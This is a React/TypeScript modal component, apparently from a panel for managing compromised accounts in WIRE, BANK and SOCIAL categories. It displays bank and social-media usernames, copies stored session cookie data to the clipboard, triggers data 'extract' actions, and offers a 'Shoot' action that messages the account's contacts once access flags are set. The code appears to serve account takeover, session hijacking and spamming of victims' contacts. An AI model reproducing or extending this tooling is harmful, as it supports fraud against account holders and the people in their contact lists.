"use client";

import { useState, useEffect, useCallback } from 'react';
import { safeParseJSON } from '../../../../utils/helpers';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faCheck, 
  faCookie, 
  faFileExport,
  faPaperPlane,
  faStickyNote,
  faClock,
  faSpinner
} from '@fortawesome/free-solid-svg-icons';
import { ShootContactsModal } from './ShootContactsModal';
import ConfirmationModal from '../../ConfirmationModal';
import { WireExtractView } from './wire/WireExtractView';
import { BankExtractView } from './bank/BankExtractView';
import { SocialExtractView } from './social/SocialExtractView';

interface ItemDetailsModalProps {
  isOpen: boolean;
  onClose: () => void;
  data: any;
  category: 'WIRE' | 'BANK' | 'SOCIAL' | null;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onExtract: (id: string) => void;
  onShootContacts?: (id: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading?: boolean;
}

interface ExtractDataState {
  isLoading: boolean;
  data: any;
  error: string | null;
}

// Custom hook for fetching extract data
const useExtractData = (url: string | null) => {
  const [extractData, setExtractData] = useState<ExtractDataState>({
    isLoading: false,
    data: null,
    error: null
  });

  useEffect(() => {
    if (!url || !url.startsWith('http')) {
      setExtractData({ isLoading: false, data: null, error: null });
      return;
    }

    const fetchData = async () => {
      setExtractData({ isLoading: true, data: null, error: null });
      try {
        const response = await fetch(url);
        const data = await response.json();
        setExtractData({ isLoading: false, data, error: null });
      } catch (error) {
        setExtractData({ isLoading: false, data: null, error: 'Failed to load extract data' });
      }
    };

    fetchData();
  }, [url]);

  return extractData;
};

export const ItemDetailsModal = ({
  isOpen,
  onClose,
  data,
  category,
  onVerify,
  onGetCookie,
  onExtract,
  onShootContacts,
  onMemoSave,
  loading
}: ItemDetailsModalProps) => {
  const [showMemoInput, setShowMemoInput] = useState(false);
  const [memoText, setMemoText] = useState('');
  const [lastSaved, setLastSaved] = useState<Date | null>(null);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showShootContactsModal, setShowShootContactsModal] = useState(false);
  const [currentAction, setCurrentAction] = useState<{
    type: 'verify' | 'cookie' | 'extract';
    id: string;
  } | null>(null);

  // Determine the URL for extract data if it's a string
  const extractUrl = typeof data?.[`${category?.toLowerCase()}Extract`] === 'string' && 
                     data[`${category?.toLowerCase()}Extract`].startsWith('http')
                     ? data[`${category?.toLowerCase()}Extract`]
                     : null;

  const { isLoading: extractIsLoading, data: fetchedExtractData, error: extractError } = useExtractData(extractUrl);

  if (!isOpen || !data || !category) return null;

  const handleAction = (type: 'verify' | 'cookie' | 'extract') => {
    setCurrentAction({ type, id: data.id });
    setShowConfirmModal(true);
  };

  const handleConfirm = async () => {
    if (!currentAction) return;

    switch (currentAction.type) {
      case 'verify':
        await onVerify(currentAction.id);
        break;
      case 'cookie':
        await onGetCookie(currentAction.id);
        break;
      case 'extract':
        await onExtract(currentAction.id);
        break;
    }
    setShowConfirmModal(false);
    setCurrentAction(null);
  };

  // Check if shoot contacts should be available
  const hasExtract = data[`${category.toLowerCase()}Extract`];
  console.log('ItemDetailsModal Debug:', {
    category,
    fullAccess: data?.fullAccess,
    verifyAccess: data?.verifyAccess,
    cookieAccess: data?.cookieAccess,
    hasExtract,
    wireSenderJSON: data?.wireSenderJSON,
    socialSenderJSON: data?.socialSenderJSON,
  });
  
  const canShootContacts = data?.fullAccess === 'TRUE' && 
    data?.verifyAccess === 'TRUE' && 
    data?.cookieAccess === 'TRUE' && 
    ((category === 'WIRE' && data?.wireSenderJSON) || 
     (category === 'SOCIAL' && data?.socialSenderJSON)) && 
    hasExtract && 
    onShootContacts && 
    category !== null;

  const handleMemoClick = () => {
    setMemoText(data.memo || '');
    setShowMemoInput(true);
  };

  const renderExtractContent = (extractUrlOrData: any) => {
    let currentExtractData = extractUrlOrData;

    if (extractUrl) { // If a URL was provided, use the fetched data
      if (extractIsLoading) {
        return (
          <div className="flex items-center justify-center p-4">
            <FontAwesomeIcon icon={faSpinner} spin className="mr-2" />
            Loading...
          </div>
        );
      }

      if (extractError) {
        return <div className="text-red-500 p-4">{extractError}</div>;
      }

      currentExtractData = fetchedExtractData;
    }

    // Try to parse the data if it's a string
    let parsedData = currentExtractData;
    if (typeof currentExtractData === 'string') {
      try {
        parsedData = JSON.parse(currentExtractData);
      } catch (e) {
        console.error('Error parsing data:', e);
        return <div className="text-red-500 p-4">Error parsing data</div>;
      }
    }

    if (!parsedData) return <div className="text-red-500 p-4">Invalid data format</div>;

    return (
      <div className="overflow-auto">
        <table className="min-w-full divide-y divide-gray-200">
          <tbody className="divide-y divide-gray-200">
            {Object.entries(parsedData).map(([key, value]) => (
              <tr key={key}>
                <td className="px-4 py-2 whitespace-nowrap font-medium text-gray-900">{key}</td>
                <td className="px-4 py-2 whitespace-pre-wrap text-gray-500">
                  {typeof value === 'object' ? JSON.stringify(value, null, 2) : String(value)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderExtractSection = (extractData: any, title: string) => {
    if (!extractData) return null;

    return (
      <div className="mt-4">
        <h4 className="text-sm font-medium text-gray-500">{title}</h4>
        <div className="mt-1 bg-gray-50 rounded-md border border-gray-200">
          {renderExtractContent(extractData)}
        </div>
      </div>
    );
  };

  const renderActionButtons = () => (
    <div className="flex space-x-2">
      {data.verified !== 'TRUE' && (
        <button
          onClick={() => handleAction('verify')}
          className="text-indigo-600 hover:text-indigo-900"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faCheck} className="mr-1" />
          Verify
        </button>
      )}

      {data.verifyAccess === 'TRUE' && data.cookieAccess === 'TRUE' && data.cookieJSON && (
        <button
          onClick={(e) => {
            e.stopPropagation();
            const cookieData = typeof data.cookieJSON === 'string' ? data.cookieJSON : JSON.stringify(data.cookieJSON);
            navigator.clipboard.writeText(cookieData);
          }}
          className="text-indigo-600 hover:text-indigo-900"
          disabled={loading}
          title="Copy Cookie Data"
        >
          <FontAwesomeIcon icon={faCookie} className="mr-1" />
          Cookie
        </button>
      )}

      {data.fullAccess === 'TRUE' && data.verifyAccess === 'TRUE' && data.cookieAccess === 'TRUE' && (
        <button
          onClick={() => handleAction('extract')}
          className="text-indigo-600 hover:text-indigo-900"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faFileExport} className="mr-1" />
          Extract
        </button>
      )}

      {canShootContacts && (
        <button
          onClick={() => setShowShootContactsModal(true)}
          className="text-indigo-600 hover:text-indigo-900"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faPaperPlane} className="mr-1" />
          Shoot
        </button>
      )}

      <button
        onClick={handleMemoClick}
        className="text-indigo-600 hover:text-indigo-900"
      >
        <FontAwesomeIcon icon={faStickyNote} className="mr-1" />
        Memo
      </button>
    </div>
  );

  const renderDetails = () => {
    switch (category) {
      case 'WIRE':
        return (
          <div className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <h4 className="text-sm font-medium text-gray-500">Email</h4>
                <p className="mt-1">{data.email}</p>
              </div>
              <div>
                <h4 className="text-sm font-medium text-gray-500">Domain</h4>
                <p className="mt-1">{data.domain}</p>
              </div>
            </div>
            {data.wireExtract && <WireExtractView data={data.wireExtract} />}
          </div>
        );

      case 'BANK':
        const bankData = safeParseJSON(data.banks) || [];
        return (
          <div className="space-y-4">
            {Array.isArray(bankData) && bankData.map((bank: any, index: number) => (
              <div key={index} className="border-b pb-4 last:border-0">
                <h3 className="font-medium">{bank.bankName}</h3>
                <div className="grid grid-cols-2 gap-4 mt-2">
                  <div>
                    <h4 className="text-sm font-medium text-gray-500">Username</h4>
                    <p className="mt-1">{bank.username}</p>
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-500">Last Used</h4>
                    <p className="mt-1">{new Date(bank.lastUsed).toLocaleString()}</p>
                  </div>
                </div>
              </div>
            ))}
            {data.bankExtract && <BankExtractView data={data.bankExtract} />}
          </div>
        );

      case 'SOCIAL':
        const socialData = safeParseJSON(data.socials) || [];
        return (
          <div className="space-y-4">
            {Array.isArray(socialData) && socialData.map((social: any, index: number) => (
              <div key={index} className="border-b pb-4 last:border-0">
                <h3 className="font-medium">{social.platform}</h3>
                <div className="grid grid-cols-2 gap-4 mt-2">
                  <div>
                    <h4 className="text-sm font-medium text-gray-500">Username</h4>
                    <p className="mt-1">{social.username}</p>
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-500">Status</h4>
                    <p className="mt-1">{social.active ? 'Active' : 'Inactive'}</p>
                  </div>
                </div>
              </div>
            ))}
            {data.socialExtract && <SocialExtractView data={data.socialExtract} />}
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <>
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
        <div className="bg-white rounded-lg w-full max-w-2xl h-[90vh] flex flex-col relative">
          <div className="flex justify-between items-center p-4 border-b">
            <h2 className="text-xl font-bold">{data.title}</h2>
            <button onClick={onClose} className="text-gray-500 hover:text-gray-700">
              ×
            </button>
          </div>
          <div className="flex-1 overflow-y-auto p-6 pb-24">
            {renderDetails()}
          </div>
          <div className="sticky bottom-0 left-0 right-0 border-t bg-white p-4 mt-auto">
            {renderActionButtons()}
          </div>
        </div>
      </div>

      <ConfirmationModal
        isOpen={showConfirmModal}
        onClose={() => setShowConfirmModal(false)}
        onConfirm={handleConfirm}
        title={`Confirm ${currentAction?.type}`}
        message={`Are you sure you want to ${currentAction?.type} this item?`}
      />

      {showShootContactsModal && (
        <ShootContactsModal
          isOpen={showShootContactsModal}
          onClose={() => setShowShootContactsModal(false)}
          onSubmit={async (submitData) => {
            if (onShootContacts) {
              await onShootContacts(submitData.id);
            }
            setShowShootContactsModal(false);
          }}
          loading={loading}
          item={data}
          category={category === 'BANK' ? undefined : category}
        />
      )}

      {showMemoInput && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-6 max-w-xl w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold">Edit Memo</h2>
              <button onClick={() => setShowMemoInput(false)} className="text-gray-500 hover:text-gray-700">
                ×
              </button>
            </div>
            <textarea
              value={memoText}
              onChange={(e) => setMemoText(e.target.value)}
              onBlur={async () => {
                if (memoText !== '') {
                  await onMemoSave(data.id, memoText);
                  setLastSaved(new Date());
                }
              }}
              className="w-full h-32 p-2 border rounded"
              placeholder="Enter memo text..."
            />
            {lastSaved && (
              <div className="mt-2 text-sm text-gray-500">
                <FontAwesomeIcon icon={faClock} className="mr-1" />
                Last saved: {lastSaved.toLocaleTimeString()}
              </div>
            )}
          </div>
        </div>
      )}
    </>
  );
};
